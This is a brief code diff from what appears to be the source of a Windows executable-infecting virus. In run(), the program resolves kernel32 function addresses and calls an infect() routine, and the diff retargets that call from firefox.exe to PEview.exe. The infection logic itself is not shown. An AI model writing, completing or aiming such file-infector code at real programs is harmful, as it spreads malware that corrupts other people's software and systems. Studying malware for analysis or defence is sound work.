@@ -28,5 +28,5 @@ int run(void) {
   if(fill_addresses(exportDir, data.kernel32Base, &data.functions) != sizeof(functions_t) / 4) {
     return 3;
   }
-  return infect("firefox.exe", &data);
+  return infect("PEview.exe", &data);
 }
